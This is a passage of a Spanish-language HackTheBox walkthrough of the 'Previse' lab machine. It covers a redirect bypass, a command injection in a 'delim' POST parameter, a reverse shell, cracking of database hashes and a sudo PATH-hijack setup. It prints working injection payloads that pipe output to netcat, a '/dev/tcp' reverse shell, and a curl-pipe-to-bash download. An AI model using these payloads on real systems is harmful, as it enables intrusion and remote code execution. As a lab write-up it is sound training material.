---
layout      : post
title       : "HackTheBox - Previse"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373banner.png
category    : [ htb ]
tags        : [ path-hijacking, code-analysis, bypass-redirect, command-injection, cracking, sudo ]
---
M√°quina **Linux** nivel f√°cil. Vamos a bypassear redirecciones, inyectar comandos en peticiones, crakeaziohn de hashes salados yyyyy a jugamientos con un **Path Hijacking** para ejecutar comandos como diosito.

![373previseHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373previseHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [m4lwhere](https://www.hackthebox.eu/profile/107145).

La paciencia, la pa ci en cia.

Encontraremos una web con un **login panel** inicialmente, existen otros recursos, pero gracias a los `redirects` no tendremos acceso a ellos. Jugaremos un **Burp** para modificar los c√≥digos de estado y as√≠ ver lo que antes no üëª.

Podremos crearnos una cuenta para pasar el **login panel**, estando dentro veremos un objeto comprimido que contiene un backup del sitio en el que estamos, por lo que podemos ver el c√≥digo `PHP` de los recursos con los que interactuamos.

Encontraremos la posibilidad de inyectar comandos en una petici√≥n, us√°ndola lograremos una **Reverse Shell** en el sistema como el usuario `www-data`.

Enumerando el servicio `MySQL` tendremos las credenciales de los usuarios del sitio web. Entre ellos esta `m4lwhere` que tambi√©n es usuario del sistema, jugando con `John The Ripper` crackearemos su contrase√±a y haciendo reutilizaci√≥n de contrase√±as lograremos una sesi√≥n por `SSH` como ***m4lwhere***.

Finalmente, encontraremos un script que llama al binario `gzip` sin una ruta absoluta, apoyados en que tenemos permisos como `root` para ejecutar ese script, efectuaremos un `Path Hijacking` y obtendremos una Shell en el sistema como ***root***.

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373rating.png" style="display: block; margin-left: auto; margin-right: auto; width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Poco real y bastante juguetona :/

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.

...

Es como si no estuvieras viviendo realmente...

1. [Reconocimiento](#reconocimiento).
  * [Enumeraci√≥n de puertos con nmap](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Ahondamos por el servidor web del puerto 80](#puerto-80).
3. [Explotaci√≥n](#explotacion).
  * [Bypasseamos **redirect** al intentar crearnos una cuenta en la web](#accounts-avoid-redirect).
  * [Inspeccionando c√≥digo fuente de los objetos del sitio web](#web-code-analysis).
  * [Logramos **RCE** usando un **command injection** en recurso de la web](#web-command-injection).
4. [Movimiento lateral - Crackeamos contrase√±as de la db](#mysql-cracking-m4lwhere).
5. [Escalada de privilegios](#escalada-de-privilegios).
  * [Encontramos posible **Path Hijacking** contra el binario **gzip** y explicamos que haremos](#gzip-path-hijacking).
  * [Efectuamos **Path Hijacking** y ejecutamos comandos como **root**](#gzip-doing-path-hijacking).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

---

## Enumeraci√≥n de puertos con nmap [üîó](#enum-nmap) {#enum-nmap}

Como siempre empezaremos descubriendo que puertos (servicios) est√°n abiertos en la m√°quina, usaremos `nmap` para eso:

```bash
‚ù± nmap -p- --open -v 10.10.11.104 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Nos devuelve:

```bash
# Nmap 7.80 scan initiated Mon Aug 23 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.11.104
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.104 () Status: Up
Host: 10.10.11.104 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Mon Aug 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 97.77 seconds
```

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Nos permite obtener una Shell de forma segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos ofrece un servidor web. |

Lo siguiente ser√° intentar descubrir que versi√≥n esta siendo ejecutada en cada servicio y adem√°s si alguno de los scripts de `nmap` nos muestra algo adicional contra ellos:

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, en este caso son solo 2 puertos, pero donde fueran muchos m√°s seria muuuy √∫til**

```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.11.104
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,80 -sC -sV 10.10.11.104 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
# Nmap 7.80 scan initiated Mon Aug 23 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.11.104
Nmap scan report for 10.10.11.104
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 21.35 seconds
```

Y obtenemos:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80     | HTTP     | Apache httpd 2.4.29 |

Vemos un `login.php`, pero poco m√°s, exploremos a ver que encontramos.

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

---

## Dando vueltas por el puerto 80 [üîó](#puerto-80) {#puerto-80}

Si nos dirigimos a la web encontramos un **login panel**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Intentando credenciales por default no logramos pasarlo y probando alg√∫n **bypass** tampoco, as√≠ que sigamos enumerando...

Podemos probar a descubrir directorios y archivos que la web est√© sirviendo, pero que est√°n fuera de nuestra vista (fuzzeo):

```bash
‚ù± dirsearch.py -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://10.10.11.104
...
Target: http://10.10.11.104/

[25:25:25] Starting: 
[25:25:25] 302 -    3KB - /index.php  ->  login.php
[25:25:25] 200 -    2KB - /login.php
[25:25:25] 302 -    0B  - /download.php  ->  login.php
[25:25:25] 200 -    0B  - /config.php
[25:25:25] 200 -  217B  - /footer.php
[25:25:25] 200 -  980B  - /header.php
[25:25:25] 200 -   15KB - /favicon.ico
[25:25:25] 302 -    0B  - /logout.php  ->  login.php
[25:25:25] 302 -    3KB - /.  ->  login.php
[25:25:25] 403 -  277B  - /.html
[25:25:25] 403 -  277B  - /.php
[25:25:25] 302 -    3KB - /status.php  ->  login.php
[25:25:25] 403 -  277B  - /.htm
[25:25:25] 403 -  277B  - /.htpasswds
[25:25:25] 200 -    1KB - /nav.php
[25:25:25] 302 -    4KB - /accounts.php  ->  login.php
[25:25:25] 302 -    5KB - /files.php  ->  login.php
[25:25:25] 403 -  277B  - /wp-forum.phps
[25:25:25] 403 -  277B  - /.htuser
[25:25:25] 403 -  277B  - /.htc
[25:25:25] 403 -  277B  - /.ht
...
```

Opa, hay varios archivos, pero la mayor√≠a nos redireccionan (status **302**) al objeto `login.php` (donde estamos), validando contra los que no nos redireccionan a ning√∫n lado llegamos a `nav.php`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373page80_navPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos un tipo de "men√∫" en el que se referencian los objetos que vimos antes, por lo cual tambi√©n llegaremos a `login.php`, peeeeeeeeeeero hay nombres muy interesantes, el que m√°s resalt√≥ fue ***Create Account (`accounts.php`)***, ya que tenemos un **login panel**, pero no una *cuenta*, por lo que si llegamos a crear una, podremos usarlo ¬øno?

# Explotaci√≥n [#](#explotacion) {#explotacion}

---

## Evitamos <u>redirect</u> al interactuar con la web [üîó](#accounts-avoid-redirect) {#accounts-avoid-redirect}

Ac√° record√© algo que podemos probar. Sabemos que si vamos por ejemplo a `accounts.php` seremos redireccionados (status **302**) al recurso `login.php`, peeeeero ¬øy si interceptamos la petici√≥n hacia ***accounts.php*** y en vez del status code ***302*** lo cambiamos por un `200 Ok`?

* [C√≥digos de estado de respuesta HTTP](https://developer.mozilla.org/es/docs/Web/HTTP/Status#respuestas_satisfactorias).

Al hacer eso le estar√≠amos diciendo que en vez de un **redirect** nos devuelva el contenido del objeto consultado (si lo encuentra) ü§ó

> Usemos **BurpSuite** para que sea m√°s grafico...

### Jugando con <u>BurpSuite</u> y las respuestas del servidor [üïπÔ∏è](#accounts-burp) {#accounts-burp}

Lo primero ser√° activar una opci√≥n (flecha izquierda) y desactivar otra (pos flecha derecha) para que nos permita modificar la respuesta del servidor:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_proxyOptions_InterceptRES.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listos, ahora s√≠, activamos el proxy tanto en **Burp** como en la web, hacemos una petici√≥n hacia `accounts.php` (dando clic en **Create Account**) y en nuestro **Burp** ver√≠amos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_accountsPHP_get.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Damos clic en `forward` para que siga con la petici√≥n y obtenemos...

* El c√≥digo de estado indicando un **redirect** (`302 Found`):

  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_accountsPHP_302Found1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

* Opaaa, tamos viendo la respuesta del archivo `accounts.php`.

  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_accountsPHP_302Found2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

* El formulario con el que env√≠a los datos de creaci√≥n.

  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_accountsPHP_302Found3.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Peeeeerrrrfectooooooo, ya teniendo los datos del formulario podr√≠amos jugar con cositas, peeeeeeeeeero hagamos lo que vinimos a hacer :P cambiemos el status code `302 Found` por `200 OK`:

**Antes**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_accountsPHP_302Found1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

**Despu√©s**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_accountsPHP_200OK.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Damos clic en `forward` para que env√≠e la petici√≥n. Y en la web vemooooooooooooooooooooos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373page80_accountsPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

(***El dise√±o es <u>taaaaaan</u> blanco que nos vamos a quedar sin ojitos***)

VAMOOOOOOOOOOOOOOOOOOOOOS, logramos ver el contenido renderizado del recurso `accounts.php` bypasseando el **redirect** inicial ¬ølindo no?

...

Bien, ahora que podemos crear cuentas, pues generemos una...

Despu√©s de hacerlo nos redirecciona a `login.php`, escribimos las credenciales que usamos para crear la cuenta yyyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373page80_dashboard.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pelfeto, tamos dentro del servidor web (: Visitando **FILES** (que nos lleva a `files.php`) vemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373page80_filesPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

üòÆ hay un comprimido que parece contener un **backup** del sitio web, si damos clic sobre √©l se descarga:

```bash
‚ù± file siteBackup.zip 
siteBackup.zip: Zip archive data, at least v2.0 to extract
```

Pues... juguemos...

## Viendo c√≥digo fuente (objetos del sitio web) [üîó](#web-code-analysis) {#web-code-analysis}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_unzip_siteBackup_files.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues s√≠, es un backup de los objetos que maneja la p√°gina web, pues demos algunas vueltas a ver que encontramos en ellos...

De primeras el objeto llamativo es `config.php`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_cat_configPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

VAMO PA IA! Tenemos las credenciales usadas por el usuario `root` contra el servidor de base de datos `MySQL`. Intentando reutilizaci√≥n de contrase√±as no logramos que sean funcionales, pero quiz√°s cuando estemos adentro del sistema (que lo estaremooooooooooooooos) podamos probar `mysql` con esas creds...

Revisando el objeto `logs.php` vemos una interacci√≥n bastaaaaaaante llamativa:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_cat_logsPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> üìë [C√≥digo completo: **logs.php**](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/previse/backup_site_files/logs.php)

Ufff, lo primero que vemos es que esta ejecutando en el sistema (`exec(...)`) un script de `Python` llamado `log_process.py` que recibe un argumento, peeeeeeero el argumento lo toma del contenido de la variable `delim` que viaja con el m√©todo `POST` sin ninguna validaci√≥n üò≥ ¬øY de d√≥nde llega esa variable? Bien, ac√° entra el objeto `file_logs.php`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_cat_fileLogsPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> üìë [C√≥digo completo: **file_logs.php**](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/previse/backup_site_files/file_logs.php)

Como vemos toma una opci√≥n entre `comma`, `space` o `tab` y una vez es procesada la petici√≥n se env√≠a al recurso `logs.php` la variable `delim` mediante el m√©todo **POST**:

```php
...
    <form action="logs.php" method="post">
...
        <select class="uk-select" name="delim" id="delim-log">
...
```

En la web ser√≠a este output:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373page80_fileLogsPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si interceptamos con `Burp` al momento de dar `Submit` ver√≠amos la petici√≥n y el campo `delim`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_logsPHP_delimNORMAL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y si la procesamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_logsPHP_delimNORMAL_res.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos una lista de √≠tems separados por ***comas*** (el valor de `delim`) de las veces que un usuario ha intentado descargar alg√∫n archivo del sitio, no profundizar√© en esto, pero les dejo el recurso con el que se genera ese contenido, solo relaci√≥nenlo con `logs.php` y les queda claritico.

> üìë [C√≥digo completo: **download.php**](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/previse/backup_site_files/download.php)

As√≠ que el que separa los √≠tems es el programa de `Python`. Volvamos a ver el c√≥digo para ahora si jugar con esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_cat_logsPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> üìë [C√≥digo completo: **logs.php**](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/previse/backup_site_files/logs.php)

Si simulamos la interacci√≥n seria algo as√≠ si a `delim` le llega **comma**:

```html
...
delim=comma
```

```php
...
exec("/usr/bin/python /opt/scripts/log_process.py comma")
...
```

No hay validaci√≥n ni sanitizacion de nada, por, lo, queeeeeeee, apoyados en que esta usando `exec()` y pr√°cticamente estamos interactuando a fuuuull con la funci√≥n, podr√≠amos enviar en `delim` ialgo como:

```html
...
delim=comma;whoami
```

```php
...
exec("/usr/bin/python /opt/scripts/log_process.py comma;whoami")
...
```

Por lo que la funci√≥n `exec()` ejecutar√≠a el programa de **Python** y como al final encuentra una nueva instrucci√≥n (`;`) intentar√≠a ejecutarla, o sea nuestro `whoami` :o

Pos probemoooooooooooooooooos...

## <u>RCE</u> usando <u>command injection</u> en la web [üîó](#web-command-injection) {#web-command-injection}

Interceptamos de nuevo la petici√≥n y agregamos nuestro `delim` malicioso:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_logsPHP_delimWHOAMI.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Enviamos yyyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_logsPHP_delimWHOAMI_fail.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Nada ü§°

Ac√° se me ocurri√≥ que quiz√°s se podr√≠a estar sobre escribiendo el output del comando, ya que el objeto `logs.php` tiene dos outputs largos, entonces pens√© en intentar el `command injection`, pero que el output del comando nos lo env√≠e a un puerto en el que estemos en escucha, pues probemos (acost√∫mbrense a probar de todoooooooooooooooo, hasta lo m√°s loco y obvio):

Levantamos el puerto `4433` con `netcat`, ah√≠ ser√° donde le indiquemos que env√≠e el resultado (en caso de que exista el `command injection`) del comando:

```bash
‚ù± nc -lvp 4433
```

Y ahora en la petici√≥n:

```html
delim=whoami | nc 10.10.14.93 4433
```

URLencodeada para que tome tooodo como una misma l√≠nea:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burp_logsPHP_delimWHOAMIandNETCAT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Enviamos yyyyyyyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_nc_id_RCEasWWW_delim_commandInjection.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PEEEEEEEEEEEEEEEERFECTOOOOOOOOOOOOOOOOO, recibimos la petici√≥n y vemos el resultado del comando `whoami`, somos `www-data`, por lo cuaaaaaal, tenemos ejecuci√≥n remota de comandos en el sistemaaaaaaaaaaaaaa.

‚õ∑Ô∏è üèÇ

Entabl√©monos una reverse shell... 

De las formas que intente la que me funciono fue esta: 

> (***Lo primero es validar si existe `curl` o `wget` en el sistema: apoyados en la explotaci√≥n har√≠amos algo as√≠: `delim=comma;which curl | nc 10.10.14.93 4433` y si nos devuelve la ruta absoluta de `cURL`, sabemos que existe, en este caso la devolvi√≥***).

Levantamos un servidor web con **Python**:

```bash
‚ù± python3 -m http.server
```

Creamos un archivo `.sh` el cual va a contener tooooodas las instrucciones que queremos que el sistema ejecute, en este caso nuestra reverse shell:

```bash
‚ù± cat rev.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.93/4433 0>&1
```

Ahora volvemos a levantar el puerto `4433` para recibir la shell ah√≠:

```bash
‚ù± nc -lvp 4433
```

Y finalmente usando `delim` ejecutamos:

```html
...
delim=comma;curl http://10.10.14.93:8000/rev.sh | bash
```

URLencodeado:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373burl_logsPHP_delimREVSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lanzamos la petici√≥n y en nuestro `netcat`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_wwwdataRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

T E N E M O S acceso a la m√°quina como el usuario `www-data` :(:(:(:(:(:

Antes de seguir hagamos que nuestra Shell sea bonita (tratamiento de la TTY) y adem√°s de eso que nos permita ejecutar `Ctrl^C`, movernos entre comandos y tener hist√≥rico de lo que hemos ejecutado:

* [https://lanzt.gitbook.io/cheatsheet-pentest/tty](https://lanzt.gitbook.io/cheatsheet-pentest/tty).

Sigamos juaquiando...

...

> **Cree un script que automatiza la obtenci√≥n de la Reverse Shell - [rediRCE.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/previse/rediRCE.py)**

...

# MySQL (cracking): www-data -> m4lwhere [#](#mysql-cracking-m4lwhere) {#mysql-cracking-m4lwhere}

Si recordamos ten√≠amos credenciales contra el servicio `mysql`, veamos si son v√°lidas:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_wwwdataSH_mysql.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Son v√°lidas, pues profundicemos a ver si hay algo que nos sirva pa' algo...

Existen estas bases de datos:

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
```

Veamos primero `previse`:

```bash
mysql> use previse;
```

Listemos sus tablas:

```mysql
mysql> show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
```

Solo dos, descubramos lo que hay en `accounts`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_wwwdataSH_mysql_SELECTfromACCOUNTS_hashes.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, tenemos la tabla donde se guardan todos los usuarios de la web, como usuario principal vemos a `m4lwhere`, que tambi√©n es un usuario del sistema:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_wwwdataSH_FOUNDm4lwhereUSER.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pos tomemos los **hashes** (contrase√±as), cre√©monos un archivo con ellas dentro e intentemos crackearlas (pasar de **hash** a texto plano):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_hashesWEBSITEdone.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

(Claramente quito a `lanza` que fue la cuenta que yo cree :P)

...

SPOILEEEEEEEEEER THINGGGGG

Antes de seguir, algo curioso de los hashes es que tienen un s√≠mbolo que no es reconocido por la terminal, pero si copiamos cualquiera de ellos y lo pegamos en el navegador, vemos que contiene:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373google_hashEMOJIsalt.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un emoji de un tarrito de sal, queeeee si buscamos en nuestros archivos (ya sea en `/var/www/html` o en los que nos devolvi√≥ el comprimido con el backup) el objeto `accounts.php` contiene la creaci√≥n del hash y la asignaci√≥n de esa [salt](https://es.quora.com/Qu%C3%A9-significa-agregar-un-salt-a-una-contrase%C3%B1a-hash):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_cat_accountsPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Solo quer√≠a mostrarles eso :P y decir que da igual que sea un emoji, finalmente es un conjunto de texto llevado a imagen, si existe coincidencia al crackearlo, nos lo mostrara (:

...

Jugaremos con `John the Ripper`:

```bash
‚ù± john --wordlist=/usr/share/wordlists/rockyou.txt hashes_website_done 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
...
```

**John** nos indica que le podemos agregar el formato `md5crypt-long` (que √©l detecta que los hashes son de ese tipo) para que si o si pruebe √∫nicamente contra ese formato, pos d√©mosle:

```bash
‚ù± john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hashes_website_done
```

Esperamos un rato a que juegue con toooodo el archivo `rockyou.txt` (nuestro diccionario) yyyyyyyyyyyy:

```bash
‚ù± john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hashes_website_done 
...
admin123         (admin)
...
ilovecody1l2235! (m4lwhere)
...
```

Opaaaaaaaaaaa, las contrase√±as en texto plano de los dos usuarios de la web, pero nos quedaremos con la de `m4lwhere` e intentaremos reutilizaci√≥n de contrase√±as a ver si son v√°lidas contra el sistema:

```bash
‚ù± ssh m4lwhere@10.10.11.104
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_ssh_m4lwhereSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

VA PA IIIIIIIIII, son v√°lidas y tenemos una sesi√≥n en el sistema como √©l (:

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando el sistema encontramos el script que se usa en la web y adem√°s vemos otro:

```bash
m4lwhere@previse:/opt/scripts$ ls -la
total 16
drwxr-xr-x 2 root     root     4096 Jul 26 18:41 .
drwxr-xr-x 3 root     root     4096 Jul 26 18:41 ..
-rwxr-xr-x 1 root     root      486 Jun  6 12:49 access_backup.sh
-rw-r--r-- 1 m4lwhere m4lwhere  320 Jun  6 12:25 log_process.py
```

Jmmm, `access_backup.sh`, tenemos permisos tanto de lectura como de ejecuci√≥n, a veeeel:

```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

Ojito, hay dos cosas bastaaante interesantes, esta referencia:

> This is configured to run with cron, added to sudo so I can run as needed

Que nos indica que la tarea ha sido asignada a una `crontab` yyyyy adem√°s agregada al archivo `sudoers` para que podamos correrla usando `sudo`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_m4lwhereSH_sudoL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Efectivamente, podemos ejecutar `/opt/scripts/access_backup.sh` como otro usuario, en este caso como `root` ü§∏‚Äç‚ôÇÔ∏è

Y lo otro interesante es la forma en que llama al binario `gzip`:

> `gzip -c ...`

Lo hace sin una ruta absoluta, ¬øya sabes que sigue y que vamos a explotar? Aj√°, un **Path Hijacking**...

## Explicaci√≥n r√°pida del <u>Path Hijacking</u> que haremos [üîó](#gzip-path-hijacking) {#gzip-path-hijacking}

---

* [Linux Privilege Escalation Using PATH Variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).

Un ***Path Hijacking*** es muy sencillo de entender, todo se centra en la variable `PATH` del sistema:

```bash
m4lwhere@previse:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

√âl -sistema- usa esa variable para buscar en cada uno de los directorios que la componen los programas que ejecutamos en la l√≠nea de comandos.

En este caso vamos a ejecutar el programa `gzip` (que sirve para comprimir objetos), busqu√©moslo y obtengamos su ruta absoluta:

```bash
m4lwhere@previse:~$ which gzip
/bin/gzip
```

Ah√≠ la tenemos, por lo que al ejecutar `gzip` (sin ruta absoluta) en la terminal, va a buscar en cada directorio del `PATH` y finalmente encontrara que el binario esta alojado en `/bin`, gr√°ficamente seria esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_echoPATH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

ENTOOOOOOOOOOOOONCES, la explotaci√≥n se basa en que nosotros generemos un archivo llamado `gzip` y -secuestremos- la variable `PATH` para que al ejecutar `gzip` el sistema encuentre PRIMERO el objeto que nosotros creamos. POOOOOOOOOOOOR lo que ejecutara tooodo lo que contenga (:

Como en este caso el binario `gzip` puede ser ejecutado como el usuario `root`, todo lo que tenga ser√° ejecutado como tal, explotemos esta vaina...

## Hacemos el <u>Path Hijacking</u> [üîó](#gzip-doing-path-hijacking) {#gzip-doing-path-hijacking}

Guardamos el valor del `PATH` por si algo:

```bash
m4lwhere@previse:~$ old_path=$PATH
m4lwhere@previse:~$ echo $old_path 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Ahora, nuestro entorno de trabajo ser√° la carpeta `/tmp/testt`, cre√©mosla:

```bash
m4lwhere@previse:~$ mkdir /tmp/testt; cd /tmp/testt
```

